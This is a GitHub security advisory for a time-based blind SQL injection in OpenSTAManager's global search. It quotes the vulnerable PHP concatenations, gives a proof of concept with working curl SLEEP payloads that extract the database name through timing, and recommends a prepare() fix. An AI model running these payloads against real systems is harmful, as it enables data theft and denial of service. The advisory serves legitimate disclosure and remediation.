# [H] OpenSTAManager has a Time-Based Blind SQL Injection with Amplified Denial of Service

## Summary
Severity: High
Advisory: GHSA-4hc4-8599-xh2h
CVE: CVE-2026-24417
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-06
Source: https://github.com/advisories/GHSA-4hc4-8599-xh2h
Type: github-advisory

## Affected
- Packagist: `devcode-it/openstamanager` — affected >=0

## Details
### Summary

Critical Time-Based Blind SQL Injection vulnerability affecting **multiple search modules** in OpenSTAManager v2.9.8 allows authenticated attackers to extract sensitive database contents including password hashes, customer data, and financial records through time-based Boolean inference attacks with **amplified execution** across 10+ modules.

**Status:** ✅ Confirmed and tested on live instance (v2.9.8)
**Vulnerable Parameter:** `term` (GET)
**Affected Endpoint:** `/ajax_search.php`
**Affected Modules:** Articoli, Ordini, DDT, Fatture, Preventivi, Anagrafiche, Impianti, Contratti, Automezzi, Interventi

### Details

OpenSTAManager v2.9.8 contains a critical Time-Based Blind SQL Injection vulnerability in the global search functionality. The application fails to properly sanitize the `term` parameter before using it in SQL LIKE clauses across multiple module-specific search handlers, allowing attackers to inject arbitrary SQL commands and extract sensitive data through time-based Boolean inference.

**Vulnerability Chain:**

1. **Entry Point:** `/ajax_search.php` (Line 30-31)
   ```php
   $term = get('term');
   $term = str_replace('/', '\\/', $term);
   ```
   The `$term` parameter undergoes minimal sanitization (only forward slash replacement).

2. **Distribution:** `/src/AJAX.php::search()` (Line 159-161)
   ```php
   $files = self::find('ajax/search.php');
   array_unshift($files, base_dir().'/ajax_search.php');
   foreach ($files as $file) {
       $module_results = self::getSearchResults($file, $term);
   ```
   The unsanitized `$term` is passed to all module-specific search handlers.

3. **Execution:** `/src/AJAX.php::getSearchResults()` (Line 373)
   ```php
   require $file;
   ```
   Each module's search.php file is included with `$term` variable in scope.

4. **Vulnerable SQL Queries:** Multiple modules directly concatenate `$term` without `prepare()`

**All Affected Files (10+ vulnerable instances):**

1. **`/modules/articoli/ajax/search.php` - Line 51** (PRIMARY EXAMPLE)
   ```php
   foreach ($fields as $name => $value) {
       $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   }
   $rs = $dbo->fetchArray($query);
   ```
   **Impact:** Direct concatenation without `prepare()`, allows full SQL injection.

2. **`/modules/ordini/ajax/search.php` - Line 43, 47**
   ```php
   $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   $query .= '... WHERE `mg_articoli`.`codice` LIKE "%'.$term.'%" OR `mg_articoli_lang`.`title` LIKE "%'.$term.'%"';
   ```

3. **`/modules/ddt/ajax/search.php` - Line 43, 47**
   ```php
   $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   ```

4. **`/modules/fatture/ajax/search.php` - Line 45, 49**
   ```php
   $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   ```

5. **`/modules/preventivi/ajax/search.php` - Line 45, 49**
   ```php
   $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   ```

6. **`/modules/anagrafiche/ajax/search.php` - Line 62, 107, 162**
   ```php
   $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   ```

7. **`/modules/impianti/ajax/search.php` - Line 46**
   ```php
   $query .= ' OR '.$value.' LIKE "%'.$term.'%"';
   ```

**Properly Sanitized (NOT vulnerable):**
- `/modules/contratti/ajax/search.php` - Uses `prepare()` correctly
- `/modules/automezzi/ajax/search.php` - Uses `prepare()` correctly

**Note:** The vulnerability has **amplified execution** - a single malicious request triggers SQL Injection across ALL vulnerable modules simultaneously, causing time-based attacks to execute 10+ times per request, multiplying the delay and leading to **504 Gateway Time-out** errors as observed on the live demo instance.

<img width="1899" height="349" alt="image" src="https://github.com/user-attachments/assets/a6cc5a75-0f4e-4f49-a750-7ae72a363bbe" />

### PoC

**Step 1: Login**
```bash
curl -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \
  -d 'username=admin&password=admin'
```

**Step 2: Verify Vulnerability (Time-Based SLEEP)**
```bash
# Test with SLEEP(1) - should take ~85+ seconds due to amplified execution
time curl -s -b /tmp/cookies.txt \
  'http://localhost:8081/ajax_search.php?term=%22%20AND%200%20OR%20SLEEP(1)%20OR%20%22'
# Result: real 72.29s

# Test with SLEEP(0) - should be fast
time curl -s -b /tmp/cookies.txt \
  'http://localhost:8081/ajax_search.php?term=%22%20AND%200%20OR%20SLEEP(0)%20OR%20%22'
# Result: real 0.30s
```

<img width="727" height="319" alt="image" src="https://github.com/user-attachments/assets/6022de5e-de91-4ebb-b02a-30358c31d96d" />


**Step 3: Data Extraction - Database Name**
```bash
# Extract first character of database name (expected: 'o' from 'openstamanager')
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_search.php?term=%22%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)%20OR%20%221%22=%221" \
  > /dev/null
# Result: real 170.32s

# Test with wrong character 'x' - should be fast
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_search.php?term=%22%20AND%20SUBSTRING(DATABASE(),1,1)=%27x%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)%20OR%20%221%22=%221" \
  > /dev/null
# Result: real 0m0.30s
```

<img width="1364" height="349" alt="image" src="https://github.com/user-attachments/assets/a1d8a7d8-bb1a-49cd-8400-136ae5e359f1" />


### Impact

**Affected Users:** All authenticated users with access to the global search functionality.

- Complete database exfiltration including customer PII, financial records, business secrets
- Extraction of password hashes for offline cracking
- Amplified time-based attacks consume 85x server resources per request

**Recommended Fix:**

Replace all instances of direct `$term` concatenation with `prepare()`:

**BEFORE (Vulnerable):**
```php
$query .= ' OR '.$value.' LIKE "%'.$term.'%"';
```

**AFTER (Fixed):**
```php
$query .= ' OR '.$value.' LIKE '.prepare('%'.$term.'%');
```

**Apply this fix to ALL affected files:**
1. `/modules/articoli/ajax/search.php` - Line 51
2. `/modules/ordini/ajax/search.php` - Lines 43, 47, 79
3. `/modules/ddt/ajax/search.php` - Lines 43, 47, 83
4. `/modules/fatture/ajax/search.php` - Lines 45, 49, 85
5. `/modules/preventivi/ajax/search.php` - Lines 45, 49, 83
6. `/modules/anagrafiche/ajax/search.php` - Lines 62, 107, 162
7. `/modules/impianti/ajax/search.php` - Line 46

## References
- https://github.com/devcode-it/openstamanager/security/advisories/GHSA-4hc4-8599-xh2h
- https://nvd.nist.gov/vuln/detail/CVE-2026-24417
- https://github.com/devcode-it/openstamanager
